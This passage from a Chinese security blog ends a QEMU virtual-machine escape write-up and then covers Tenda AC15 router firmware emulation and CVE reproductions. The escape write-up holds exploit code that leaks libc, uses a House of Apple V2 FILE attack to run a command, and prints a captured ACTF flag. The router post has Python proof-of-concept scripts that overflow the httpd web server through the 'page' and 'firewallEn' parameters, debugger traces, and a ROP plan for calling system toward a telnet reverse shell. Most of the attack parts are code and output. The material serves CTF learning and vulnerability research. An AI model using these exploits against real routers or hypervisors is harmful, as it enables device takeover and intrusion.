libc_base;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Prepare mmio and pmio ...&quot;</span>);</span><br><span class="line">  <span class="built_in">setup_pmio</span>();</span><br><span class="line">  <span class="built_in">setup_mmio</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Write state-&gt;buffer...&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(buf); i += <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">mmio_write</span>(i, *(<span class="type">uint32_t</span> *)(buf + i));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Write to set 0xA31 to 1...&quot;</span>);</span><br><span class="line">  <span class="built_in">pmio_writeb</span>(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  ret = <span class="built_in">pmio_readb</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;0xA31 : %#lx&quot;</span>, ret);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Malloc...&quot;</span>);</span><br><span class="line">  <span class="built_in">pmio_writel</span>(<span class="number">0x10</span>, <span class="number">0xdeadbeef</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Leak libc...&quot;</span>);</span><br><span class="line">  low = <span class="built_in">mmio_read</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">mmio_write</span>(<span class="number">0x40</span>, (low &amp; <span class="number">0xff000000</span>) + <span class="number">0x8a0</span>);</span><br><span class="line">  leak_main_arena = <span class="built_in">pmio_readll</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">mmio_write</span>(<span class="number">0x40</span>, leak_main_arena + <span class="number">0x870</span>);</span><br><span class="line">  libc_base = <span class="built_in">pmio_readll</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;leak main_arena : %#lx&quot;</span>, leak_main_arena + <span class="number">0x870</span>);</span><br><span class="line">  libc_base -= <span class="number">0x1913c80</span>;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;libc base : %#lx&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> system_fptr = libc_base + <span class="number">0x1749d70</span>;</span><br><span class="line">  <span class="type">uint64_t</span> IO_wfile_jumps = <span class="number">0x19100c0</span> + libc_base;</span><br><span class="line">  <span class="type">uint64_t</span> IO_list_all = <span class="number">0x1914680</span> + libc_base;</span><br><span class="line">  <span class="type">uint64_t</span> fake_io_addr = leak_main_arena + <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;House of apple V2 ...&quot;</span>);</span><br><span class="line">  <span class="type">char</span> cmd[<span class="number">0x18</span>] = <span class="string">&quot;  cat flag 1&gt;&amp;2&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x18</span>; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">arb_write</span>(fake_io_addr + i, *(<span class="type">uint64_t</span> *)(cmd + i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0x18</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0x28</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0x68</span>, system_fptr);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0xa0</span>, fake_io_addr);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0xd8</span>, IO_wfile_jumps);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0xe0</span>, fake_io_addr);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">arb_write</span>(IO_list_all, fake_io_addr);</span><br><span class="line">  <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ <span class="comment"># ./exp</span></span><br><span class="line">[+] exp.c       Prepare mmio and pmio ...</span><br><span class="line">[*] exp.c       init pmio</span><br><span class="line">[*] exp.c       init mmio</span><br><span class="line">[+] exp.c       Write state-&gt;buffer...</span><br><span class="line">[+] exp.c       Write to <span class="built_in">set</span> 0xA31 to 1...</span><br><span class="line">[*] exp.c       0xA31 : 0</span><br><span class="line">[+] exp.c       Malloc...</span><br><span class="line">[+] exp.c       Leak libc...</span><br><span class="line">[*] exp.c       leak main_arena : 0x7f0f680008a0</span><br><span class="line">[*] exp.c       libc base : 0x7f0f6d4e9000</span><br><span class="line">[+] exp.c       House of apple V2 ...</span><br><span class="line">[    4.651800] exp (53) used greatest stack depth: 14000 bytes left</span><br><span class="line">~ <span class="comment"># exit</span></span><br><span class="line">[    6.480651] ACPI: PM: Preparing to enter system <span class="built_in">sleep</span> state S5</span><br><span class="line">[    6.481266] reboot: Power down</span><br><span class="line">ACTF&#123;7ry_b4by_q3mu_ch@1leng3_4nd_g3t_b@by_f1ag&#125;</span><br></pre></td></tr></table></figure>


<p>更简单的办法 todo：存在ORW内存区域，可以写shellcode。</p>
<h2 id="MORE"><a href="#MORE" class="headerlink" title="MORE"></a>MORE</h2><ol>
<li>qemu中存在很多函数，有时候泄露libc有时有点多余。</li>
<li>可以在 State 中寻找 MemroyRegion 的 ops</li>
<li>想要符号表，那就自己编译一个。</li>
</ol>
<p>Qemu8.x之后有个巨大的RWX段：<a href="https://eqqie.cn/index.php/archives/2077">[bi0sCTF 2024]: virto-note</a></p>
<h3 id="Qemu-minitor"><a href="#Qemu-minitor" class="headerlink" title="Qemu minitor"></a>Qemu minitor</h3><p> <code>ctrl + a =&gt; c</code> 进入minitor控制台。在monitor控制台中，可以完成很多常规操作，比如<strong>添加删除设备</strong>、<strong>虚拟机音视频截取</strong>、<strong>获取虚拟机运行状态</strong>、<strong>更改虚拟机运行时配置</strong>等等。并且可以执行一定的命令</p>
<h3 id="Qemu-KVM"><a href="#Qemu-KVM" class="headerlink" title="Qemu KVM"></a>Qemu KVM</h3><p>KVM（Kernal-based Virtual Machine，基于内核的虚拟机）是一个内核模块，可为用户空间程序提供完整的虚拟化基础架构。 它允许一个人运行多个运行未修改的Linux或Windows映像的虚拟机。</p>
<p>KVM的用户空间组件包含在主线QEMU（快速仿真器）中，该QEMU特别处理设备仿真。</p>
<h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>todo</p>
<ul>
<li>ACTF2023 EasyVirtio CVE-2023-3180</li>
<li>CVE-2019-6778</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://www.phrack.org/issues/70/5.html">VM escape - QEMU Case Study</a></li>
<li><a href="https://xtxtn.github.io/2023/11/02/ACTF2023/">ACTF2023 EasyVirtio</a></li>
<li><a href="https://richardweiyang-2.gitbook.io/understanding_qemu/00-devices/01-type_register">understanding_qemu</a></li>
<li><a href="https://eqqie.cn/index.php/archives/1834">https://eqqie.cn/index.php/archives/1834</a></li>
</ul>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>Tenda-cve</title>
    <url>/2024/03/21/Tenda-CVE/</url>
    <content><![CDATA[<blockquote>
<p>IoT简易入门</p>
</blockquote>
<span id="more"></span>

<p>复现，有了经验后尝试挖掘</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h3><p><a href="https://github.com/ReFirmLabs/binwalk">binwalk</a>: 可以分析并且解包</p>
<p>没有加密，因此可以使用binwalk解包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -e, --extract                Automatically extract known file types</span></span><br><span class="line"><span class="comment"># -M, --matryoshka             Recursively scan extracted files</span></span><br><span class="line"><span class="comment"># 也就是递归解包</span></span><br><span class="line">$ binwalk -Me xxx.bin</span><br></pre></td></tr></table></figure>

<h3 id="仿真"><a href="#仿真" class="headerlink" title="仿真"></a>仿真</h3><p>有资金可以买个设备，效果更好。没资金的就虚拟运行</p>
<p>主要参考：<a href="https://github.com/SecureNexusLab/IoTFirmwareAnalysisGuide/blob/main/GuideTutorial/3-%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F.md">固件仿真</a></p>
<h4 id="qemu-user"><a href="#qemu-user" class="headerlink" title="qemu-user"></a>qemu-user</h4><p>下载静态编译的qemu-user，避免某些动态链接库导致运行错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install qemu-user-static</span><br></pre></td></tr></table></figure>

<h4 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu-system"></a>qemu-system</h4><p>QEMU-System是QEMU项目的一部分，它提供了完整的虚拟化和仿真环境，允许用户模拟整个计算机系统，包括CPU、内存、外部设备等。QEMU-System是一种强大的工具，可用于多种用途，包括虚拟化、操作系统开发、嵌入式系统测试和仿真等。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install qemu-system</span><br></pre></td></tr></table></figure>

<h5 id="搭建网桥"><a href="#搭建网桥" class="headerlink" title="搭建网桥"></a>搭建网桥</h5><p>bridge是一个虚拟网络设备，所以具有网络设备的特征，可以配置IP、MAC地址等；其次，bridge是一个虚拟交换机，和物理交换机有类似的功能。</p>
<p>添加一个虚拟网桥并且获得IP地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install uml-utilities bridge-utils net-tools</span><br><span class="line"><span class="comment"># 添加一个网桥</span></span><br><span class="line">$ sudo brctl addbr br0</span><br><span class="line"><span class="comment"># add interface</span></span><br><span class="line">$ sudo brctl addif br0 eth0</span><br><span class="line"><span class="comment"># 网桥 up</span></span><br><span class="line">$ sudo ifconfig br0 up</span><br><span class="line"><span class="comment"># dhcp 获得IP</span></span><br><span class="line">$ sudo dhclient br0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除网桥</span></span><br><span class="line">$ sudo ifconfig br0 down         </span><br><span class="line">$ sudo brctl delbr br0</span><br></pre></td></tr></table></figure>

<p>iproute2: <a href="https://linux.cn/article-4326-1.html">iproute2 对决 net-tools</a>，现在大部分linux默认安装这个工具而不是net-tools</p>
<p>参考 <a href="https://wiki.archlinux.org/title/Network_bridge">ArchWiki</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建一个网桥</span></span><br><span class="line">$ sudo ip <span class="built_in">link</span> add name br0 <span class="built_in">type</span> bridge</span><br><span class="line">$ sudo ip <span class="built_in">link</span> <span class="built_in">set</span> dev br0 up</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将网卡加入/删除网桥</span></span><br><span class="line"><span class="comment"># 想要添加Interface到网桥上，interface状态必须是Up</span></span><br><span class="line">$ sudo ip <span class="built_in">link</span> <span class="built_in">set</span> eth1 master br0</span><br><span class="line">$ sudo ip <span class="built_in">link</span> <span class="built_in">set</span> eth1 nomaster</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置ip地址,需要结合自己的网关等进行设置</span></span><br><span class="line"><span class="comment"># IP address attached to eth1: 10.2.3.4/8</span></span><br><span class="line">$ sudo ip address add 10.2.3.4/8 dev br0</span><br></pre></td></tr></table></figure>

<p>tun网卡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ip tuntap add dev tap0 mod tap <span class="comment"># 创建 tap </span></span><br><span class="line">$ ip tuntap add dev tun0 mod tun <span class="comment"># 创建 tun</span></span><br></pre></td></tr></table></figure>

<h5 id="chroot"><a href="#chroot" class="headerlink" title="chroot"></a>chroot</h5><p>首先，可以在<a href="https://people.debian.org/~aurel32/qemu">aurel32&#x2F;qemu</a>下载qemu-system所需的文件</p>
<ul>
<li>kernel: zImage 格式压缩的 linux kernel</li>
<li>inited: ramdisk 镜像</li>
<li>drive: 文件系统镜像</li>
<li>主要是net，设置为我们设置的网桥</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-arm \</span><br><span class="line">	-M vexpress-a9 \</span><br><span class="line">	-kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">	-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">	-drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">	-append <span class="string">&quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span> \</span><br><span class="line">	-net nic \</span><br><span class="line">	-net tap,ifname=br0,script=no,downscript=no \</span><br><span class="line">	-nographic</span><br></pre></td></tr></table></figure>

<h4 id="FAT"><a href="#FAT" class="headerlink" title="FAT"></a>FAT</h4><p><a href="https://github.com/attify/firmware-analysis-toolkit">firmware-analysis-toolkit</a>: 依赖<a href="https://github.com/firmadyne/firmadyne">firmadyne</a>进行模拟</p>
<p>安装，会安装binwalk，并且和之前的冲突</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/attify/firmware-analysis-toolkit</span><br><span class="line">$ <span class="built_in">cd</span> firmware-analysis-toolkit</span><br><span class="line">$ ./setup.sh</span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./fat.py xxx.bin</span><br></pre></td></tr></table></figure>

<h4 id="Unicorn"><a href="#Unicorn" class="headerlink" title="Unicorn"></a>Unicorn</h4><p>Unicorn 是一个 CPU 模拟器，</p>
<p><a href="https://github.com/unicorn-engine/unicorn">unicorn: Unicorn CPU emulator framework (ARM, AArch64, M68K, Mips, Sparc, PowerPC, RiscV, S390x, TriCore, X86) </a></p>
<h4 id="Qiling"><a href="#Qiling" class="headerlink" title="Qiling"></a>Qiling</h4><p>qiling由Unicorn引擎支持。</p>
<p><a href="https://github.com/qilingframework/qiling">qiling: A True Instrumentable Binary Emulation Framework</a></p>
<p>源码或者docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/qilingframework/qiling</span><br><span class="line"><span class="comment"># 文件系统</span></span><br><span class="line">$ <span class="built_in">cd</span> qiling &amp;&amp; git submodule update --init --recursive pip3 install .</span><br><span class="line">$ pip3 install .</span><br></pre></td></tr></table></figure>

<h2 id="编译ghidra"><a href="#编译ghidra" class="headerlink" title="编译ghidra"></a>编译ghidra</h2><p>mips反编译下ghidra更好用</p>
<p>Linux可以使用包管理器下载，windows也可以直接下载release里的内容。</p>
<p>编译结果在<code>build/dist/</code>，是一个压缩包，这样每次更新就重新编译，不用每次更新下载release了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS&gt; gradle -I gradle/support/fetchDependencies.gradle init</span><br><span class="line">PS&gt; gradle buildGhidra</span><br></pre></td></tr></table></figure>

<h2 id="获取固件"><a href="#获取固件" class="headerlink" title="获取固件"></a>获取固件</h2><p><a href="https://github.com/re1wn/IoT-fstm/blob/main/IoT-project/%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97.md">物联网设备固件分析指南</a></p>
<ol>
<li>硬件：飞线，拆芯片，uart串口</li>
<li>网络抓包：更新包时会请求并且下载</li>
<li>官网：官网提供下载</li>
<li>伸手党：问认识的大佬要😋</li>
</ol>
<h2 id="IDA-plugins"><a href="#IDA-plugins" class="headerlink" title="IDA plugins"></a>IDA plugins</h2><p>历年比较好的IDA插件，改url后面的年份查看：<a href="https://hex-rays.com/contests_details/contest2023/">Plug-In Contest</a></p>
<p>也可以自己开发</p>
<h2 id="tenda"><a href="#tenda" class="headerlink" title="tenda"></a>tenda</h2><ul>
<li><a href="https://www.tenda.com.cn/download/default.html">资料下载_腾达官方网站</a></li>
<li><a href="https://www.tendacn.com/download/default.html">Download_Tenda-All For Better NetWorking</a></li>
</ul>
<h3 id="CVE-2018-18708"><a href="#CVE-2018-18708" class="headerlink" title="CVE-2018-18708"></a>CVE-2018-18708</h3><p>参考文章：<a href="https://blog.xmcve.com/2022/10/08/CVE-2018-18708-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Tenda CVE-2018-18708 漏洞复现</a></p>
<p>固件: <a href="https://www.tenda.com.cn/download/detail-2680.html">AC15 V15.03.05.19</a></p>
<p>漏洞存在于bin&#x2F;httpd：路由器的web服务器——httpd中的一个缓冲区溢出漏洞。 在处理 post 请求的函数<code>fromAddressNat</code>的<code>page</code>参数时，该值直接在 sprintf 中用于放置在堆栈上的局部变量，这会覆盖函数的返回地址。</p>
<p>直接看反编译代码，<code>entrys</code> <code>mitInterface</code> <code>page</code>三个参数用户可控，page会被sprintf拼接到v6中， 并没有对大小进行检查，导致了栈溢出漏洞</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">fromAddressNat</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">256</span>]; <span class="comment">// [sp+14h] [bp-418h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">512</span>]; <span class="comment">// [sp+114h] [bp-318h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">256</span>]; <span class="comment">// [sp+314h] [bp-118h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// [sp+414h] [bp-18h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// [sp+418h] [bp-14h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// [sp+41Ch] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="built_in">sizeof</span>(v4));</span><br><span class="line">  v9 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_2BA8C</span>(a1, <span class="string">&quot;entrys&quot;</span>, &amp;unk_E5D48);</span><br><span class="line">  v8 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_2BA8C</span>(a1, <span class="string">&quot;mitInterface&quot;</span>, &amp;unk_E5D48);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%s;%s&quot;</span>, v9, v8);</span><br><span class="line">  <span class="built_in">sub_4EC58</span>(<span class="string">&quot;adv.addrnat&quot;</span>, s, <span class="number">126</span>);</span><br><span class="line">  v7 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_2BA8C</span>(a1, <span class="string">&quot;page&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">  v1 = <span class="built_in">sprintf</span>(v6, <span class="string">&quot;advance/addressNatList.asp?page=%s&quot;</span>, v7);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">CommitCfm</span>(v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(v4, <span class="string">&quot;advance_type=%d&quot;</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="built_in">send_msg_to_netctrl</span>(<span class="number">5</span>, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_2BE4C</span>(a1, v6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>交叉引用寻找到，推测是注册路由的地方，我们可以从这入手挖洞</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_42378</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">sub_171EC</span>(<span class="string">&quot;GetStaticRouteCfg&quot;</span>, formGetRouteStatic);</span><br><span class="line">  <span class="built_in">sub_171EC</span>(<span class="string">&quot;SetStaticRouteCfg&quot;</span>, fromSetRouteStatic);</span><br><span class="line">  <span class="built_in">sub_171EC</span>(<span class="string">&quot;addressNat&quot;</span>, fromAddressNat);</span><br><span class="line">  <span class="built_in">sub_10120</span>(<span class="string">&quot;mNatGetStatic&quot;</span>, mNatGetStatic);</span><br><span class="line">  <span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p>然后运行http服务。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ cp $(which qemu-arm-<span class="type">static</span>) .</span><br><span class="line">$ sudo chroot . ./qemu-arm-<span class="type">static</span> bin/httpd</span><br></pre></td></tr></table></figure>

<p>然后对着参考文章进行patch，或者配置网桥</p>
<p>配置网桥，至于网桥名称为什么是br0：<a href="https://blog.csdn.net/song_lee/article/details/113800058">Tenda AC15 路由器漏洞分析与复现</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ip <span class="built_in">link</span> add br0 <span class="built_in">type</span> bridge</span><br><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> eth0 br0 master</span><br><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> br0 up</span><br><span class="line">sudo ip addr add dev br0 192.168.85.200/24 </span><br></pre></td></tr></table></figure>

<p>cfm fail: patch一下</p>
<ul>
<li>问题解决：<a href="https://blog.csdn.net/FigBB/article/details/134856961">ida pro使用Apply patches to保存修改时提示patching canceled..解决方法</a></li>
</ul>
<p>Cookie: password&#x3D;是必要的，后面的值可以随便填</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GET /main.html HTTP/1.1</span><br><span class="line">Host: 192.168.85.131</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Cookie: password=hamster</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: </span><br></pre></td></tr></table></figure>

<p>使用给出PoC导致segment fault，将IP改了，其余不重要</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;192.168.85.131&#x27;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line">r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">li(<span class="string">&#x27;[+] connecting&#x27;</span>)</span><br><span class="line">r.connect((ip, port))</span><br><span class="line">li(<span class="string">&#x27;[+] connect finish&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rn = <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">p1 = cyclic(<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b&#x27;page=&#x27;</span> + p1</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b&quot;POST /goform/addressNat&quot;</span> + <span class="string">b&quot; HTTP/1.1&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Host: 192.168.0.1&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Accept-Language: en-US,en;q=0.5&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Accept-Encoding: gzip, deflate&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Cookie: password=hum1qw&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Connection: close&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Upgrade-Insecure-Requests: 1&quot;</span> + rn</span><br><span class="line">p3 += (<span class="string">b&quot;Content-Length: %d&quot;</span> % <span class="built_in">len</span>(p2)) +rn</span><br><span class="line">p3 += <span class="string">b&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span>+rn</span><br><span class="line">p3 += rn</span><br><span class="line">p3 += p2</span><br><span class="line"></span><br><span class="line">li(<span class="string">&#x27;[+] sendling payload&#x27;</span>)</span><br><span class="line">r.send(p3)</span><br><span class="line"></span><br><span class="line">response = r.recv(<span class="number">4096</span>)</span><br><span class="line">response = response.decode()</span><br><span class="line">li(response)</span><br></pre></td></tr></table></figure>


<p>动态调试</p>
<p>qemu开启gdbserver</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo qemu-arm-static -g 1234 -L ./ ./bin/httpd</span><br></pre></td></tr></table></figure>

<p>gdb attach</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gdb-mulitarch</span><br><span class="line">$ file bin/httpd</span><br><span class="line">$ b *0x00079F64</span><br></pre></td></tr></table></figure>

<p>发送PoC，调试到漏洞出现的地方</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">► 0x7a064 &lt;fromAddressNat+256&gt;    bl     <span class="comment">#sprintf@plt                       &lt;sprintf@plt&gt;</span></span><br><span class="line">       s: 0x4080010c ◂— 0x0</span><br><span class="line">       format: 0xe6054 ◂— <span class="string">&#x27;advance/addressNatList.asp?page=%s&#x27;</span></span><br><span class="line">       vararg: 0x125250 ◂— 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>在函数返回时，将pc赋值 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ► 0x7a0c8 &lt;fromAddressNat+356&gt;    sub    sp, fp, <span class="comment">#8</span></span><br><span class="line">   0x7a0cc &lt;fromAddressNat+360&gt;    pop    &#123;r4, fp, pc&#125;</span><br><span class="line"></span><br><span class="line">// ...</span><br><span class="line">Invalid address 0x61616160</span><br></pre></td></tr></table></figure>


<h3 id="CVE-2023-27021"><a href="#CVE-2023-27021" class="headerlink" title="CVE-2023-27021"></a>CVE-2023-27021</h3><p>参考：<a href="https://xz.aliyun.com/t/13506?time__1311=mqmxnQiQi=DQ0=GODlcIEHfh+fhfrD&alichlgref=https://cn.bing.com/#toc-5">路由器通用0day漏洞挖掘及RCE思路</a></p>
<p>相同的固件，函数是 <code>formSetFirewallCfg</code></p>
<p>PoC</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.85.131/goform/SetFirewallCfg&quot;</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;password=hamster&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">500</span></span><br><span class="line">data = &#123;<span class="string">&quot;firewallEn&quot;</span>: payload&#125;</span><br><span class="line">resp = requests.post(url, headers=header, data=data, timeout=<span class="number">5</span>)</span><br><span class="line">resp = requests.post(url, headers=header, data=data, timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>

<p>这两个漏洞都是可以控制函数执行流的，因此需要学习一下ROP是如何写</p>
<ul>
<li>libcbase: 在gdb里面vmmap一下</li>
<li>ROP: 需要知道各个寄存器的作用</li>
<li>路由器一般不支持bin&#x2F;bash命令，选择用telnet来getshell</li>
</ul>
<p>可以使用pop pc 来控制函数执行流</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop &#123;r3, pc&#125;</span><br><span class="line">r3_val: system_addr</span><br><span class="line">pc: 将地址改成下面指令地址</span><br><span class="line">	mov r0, sp // r0作为第一个参数</span><br><span class="line">	blx, r3</span><br></pre></td></tr></table></figure>

<p>telnet 反弹shell</p>
<ul>
